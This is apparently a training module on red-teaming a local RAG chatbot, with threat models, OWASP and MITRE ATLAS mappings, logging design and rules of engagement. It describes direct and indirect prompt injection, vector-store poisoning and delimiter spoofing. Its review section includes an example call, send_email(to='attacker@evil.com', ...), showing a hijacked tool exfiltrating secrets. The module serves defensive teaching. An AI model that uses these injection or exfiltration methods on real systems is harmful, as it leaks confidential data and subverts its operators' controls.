# Module 4: Security Considerations and the AI Red Team Lifecycle

## Objective
Establish the formal threat model, trust boundary maps, regulatory framework alignments (OWASP Top 10 for LLM Applications 2025/2026, MITRE ATLAS), telemetry logging architecture, and Rules of Engagement (RoE) for the local RAG chatbot ecosystem.

---

## Lab 1: Data Flow & Trust Boundary Diagram

```text
       [ UNTRUSTED ZONE: EXTERNAL ACTORS ]
       +---------------------------------+
       |         Adversary / User        |
       +---------------------------------+
                       |
        (Vector 1: Direct User Prompt)
                       |
=======================v========================================== [ TRUST BOUNDARY 1 ]
       +---------------------------------+
       |      Host Application Logic     |
       |  - Keyword Blacklist            |
       |  - JSON Schema Validator        |
       +---------------------------------+
          |                           ^
          | (Search Query)            | (Retrieved Context Chunks)
          v                           |
======================================v=========================== [ TRUST BOUNDARY 2 ]
       +---------------------------------+
       |    Vector Store (Embeddings)    | <--- (Vector 2: Document Poisoning)
       |    - nomic-embed-text           |
       +---------------------------------+
          |
          | (Assembled Context + Augmented Prompt)
          v
================================================================== [ TRUST BOUNDARY 3 ]
       +---------------------------------+
       |  Inference Engine (Ollama Host) |
       |  - Model: llama3.1:8b           |
       |  - Non-deterministic Attention  |
       +---------------------------------+
          |
          | (Function Execution Request)
          v
================================================================== [ TRUST BOUNDARY 4 ]
       +---------------------------------+
       |   Host Tool Execution Runtime   |
       |   - get_weather()               |
       |   - send_email() [SIDE EFFECTS] | ---> (Vector 3: Tool Exfiltration)
       +---------------------------------+

```

### Trust Boundary Analysis

* **Boundary 1 (User Input Boundary):** Separates external user-controlled text from internal application routing.
* **Boundary 2 (Retrieval Boundary):** Separates application logic from the knowledge base store. Internal documents must be treated as untrusted because any actor with write access can poison RAG chunks.
* **Boundary 3 (Model Execution Boundary):** Separates deterministic host instructions from the stochastic neural network context window.
* **Boundary 4 (Side-Effect Execution Boundary):** Separates model output tokens from executable operating system capabilities (e.g., dispatching uninspected emails).

---

## Lab 2: OWASP Top 10 for LLM Applications

| OWASP 2026 ID | Risk Title (2026) | Application Relevance & Injection Surface | Boundary Node |
| :--- | :--- | :--- | :--- |
| **LLM01** | Prompt Injection | User input or poisoned RAG chunks override system prompt directives to extract secrets. | Boundaries 1 & 2 |
| **LLM02** | Sensitive Information Disclosure | The model leaks the canary token (`DELTA-909-OBSIDIAN`) or private M&A data (`Project Bluebird`). | Boundary 3 |
| **LLM03** | Excessive Agency | The model executes `send_email()` autonomously without a Human-in-the-Loop (HITL) approval gate. | Boundary 4 |
| **LLM04** | Supply Chain | Backdoored base weights pulled via Ollama (`llama3.1:8b`) or malicious embedding adapters. | Model Host |
| **LLM05** | Data and Model Poisoning | Attacker modifies corporate files (`DOC-01` to `DOC-05`) to inject malicious operational policies. | Boundary 2 |
| **LLM06** | Unbounded Consumption | Large prompt payloads exhaust host VRAM, causing local inference denial-of-service. | Boundary 1 |
| **LLM07** | Misinformation | Model generates false policy guidance when retrieval chunks return low similarity scores. | Boundary 3 |
| **LLM08** | Hidden Context Exposure | Direct queries manipulate the model into printing internal developer instructions and persona rules. | Boundary 3 |
| **LLM09** | Vector and Embedding Weaknesses | Cosine similarity collision attacks force malicious chunks into top retrieval positions. | Boundary 2 |
| **LLM10** | Improper Output Handling | Model outputs raw text on refusal, triggering unhandled JSON decode exceptions in the host app. | Boundary 1 / App |

---

---

## Lab 3: MITRE ATLAS Matrix Technique Mapping

| ATLAS ID | Tactic | Technique Name | Exploitation Vector in Local Stack |
| --- | --- | --- | --- |
| **AML.T0051** | Execution | LLM Prompt Injection | Injecting escape markers inside the interactive user chat to override Atlas persona rules. |
| **AML.T0051.001** | Execution | LLM Prompt Injection: Indirect | Injecting secondary instructions into knowledge documents stored in the vector database. |
| **AML.T0053** | Execution | AI Agent Tool Invocation (formerly LLM Plugin Compromise) | Hijacking the `send_email` tool arguments to exfiltrate canary secrets to external recipients. |

---



## Lab 4: Observability & Logging Architecture 

| Telemetry Target | Captured Data Fields | Storage Target | OWASP Detection Utility (2026) |
| :--- | :--- | :--- | :--- |
| **Ingress Prompts** | Raw text, timestamp, source IP, token length | `ingress_audit.log` | **LLM01, LLM06** (Jailbreak patterns, unbounded consumption) |
| **Retrieval Hits** | Query vector, retrieved chunk IDs, similarity scores | `rag_retrieval.log` | **LLM05, LLM09** (Data poisoning, vector weaknesses) |
| **Raw Model Output** | Token stream, inference duration, stop reason | `model_raw.log` | **LLM02, LLM08** (Canary disclosure, hidden context exposure) |
| **Tool Invocations** | Function name, parsed arguments, return payload | `tool_execution.log`| **LLM03** (Excessive agency, unauthorized dispatch) |
| **Application Errors** | JSONDecodeError stack traces, dropped payloads | `app_exceptions.log`| **LLM10** (Improper output handling / downstream parser crashes) |

---

## Lab 5: Engagement Rules of Engagement (RoE)

### 1. Assessment Scope

* **Authorized Targets:**
* Local Ollama Daemon (`http://localhost:11434`)
* Chatbot Target (`02_Working_with_LLMs/chatbot.py`)
* RAG Pipeline Application (`03_Extending_and_Customizing_LLMs/rag_chatbot.py`)


* **Out-of-Scope:**
* Public model registries (Hugging Face / Ollama upstream repositories).
* Host operating system exploitation outside the Python runtime sandbox.



### 2. Operational Constraints & Boundaries

* **Execution Throttling:** Inference calls are rate-limited to local compute capacity. No parallel distributed fuzzing that causes host OS lockups.
* **Tool Isolation:** Tool execution tests must use mock functions (`print()` dispatchers). No integration with live external SMTP servers or unverified webhooks.
* **Deterministic Baseline:** All vulnerability evaluations must run at `temperature: 0.0` with static seeds to ensure reproducible findings.

### 3. Sensitive Data Handling & Evidence Storage

* **Canary Extraction:** Disclosed canaries (`DELTA-909-OBSIDIAN`) must be documented with SHA-256 hashes in public deliverables rather than plaintext strings where customer NDAs apply.
* **Log Retention:** Full prompt-response logs containing adversarial attempts will remain stored locally inside non-committed `.audit/` directories.

---

## Check Yourself: Technical Defense Analysis

### 1. Safety Failure vs. Security Failure in the Same Chatbot

* **Safety Failure:** The model generates hate speech, slurs, or instructions on how to synthesize explosives when asked by an adversarial user. The system causes reputational harm or safety violations without accessing internal assets.
* **Security Failure:** The model is tricked into reading `DOC-05` and exfiltrating confidential corporate acquisition details via `send_email(to="attacker@evil.com", ...)`. The system's operational integrity, confidentiality, and capabilities are compromised.

### 2. What Turns Prompt Injection from Annoying into Serious?

* **Access to Impactful Side Effects (Tools & Data):** Prompt injection inside a closed conversational sandbox only results in unusual text on a screen. The moment the LLM is connected to tools (database access, file writes, email dispatch, APIs) or private data stores (RAG databases), prompt injection turns into  Unauthorized Action Execution via natural language.

### 3. Why is Indirect Injection Harder to Defend than Direct Injection?

* **Direct injection** enters through an untrusted interface (the user chat box) where developers know to place input validation, rate limiting, and defensive filters.
* **Indirect injection** enters through ostensibly trusted data stores (web search results, incoming emails, uploaded PDF manuals, RAG vector databases). The developer treats these data sources as application context rather than hostile input, allowing malicious instructions to bypass frontline firewalls entirely.

### 4. Which Lifecycle Phase Do the "Places Outside Text Can Enter" Belong To?

* They belong to **Phase 2: Reconnaissance & Attack Surface Mapping**. Identifying every entry point (user input, vector chunks, tool returns) must be completed before developing payloads or attempting initial access.

### 5. Why is Prompt Injection Not Just Another Injection Bug Like SQLi?

* **Lack of Out-of-Band Control Planes:** In SQL, the processor uses strict separation: code structure (`SELECT * FROM users WHERE id = ?`) is compiled, and user input is passed through a distinct parameter channel where it cannot be interpreted as SQL syntax.
* In an LLM, instructions, system prompts, retrieved context, and user input are flattened into a single stream of statistical tokens. The transformer calculates attention across all tokens uniformly. There is no physical architecture separating instructions from data at the computational level.

### 6. Five Attack Examples Mapped to MITRE ATLAS Tactics

1. **Reconnaissance (`AML.TA0002`):** Probing system responses with edge-case characters to determine context window length and extract system instructions.
2. **Initial Access (`AML.TA0004`):** Submitting a user prompt containing delimiters (`--- START RETRIEVED CONTEXT ---`) to spoof application formatting.
3. **Execution (`AML.TA0005`):** Running an adversarial jailbreak payload that causes the model to ignore safety alignment rules.
4. **Persistence (`AML.TA0006`):** Injecting a poisoned policy chunk into a company wiki that is subsequently indexed into the RAG vector store.
5. **Exfiltration (`AML.TA0010`):** Forcing the model to invoke `send_email` with internal system canaries populated in the payload body.
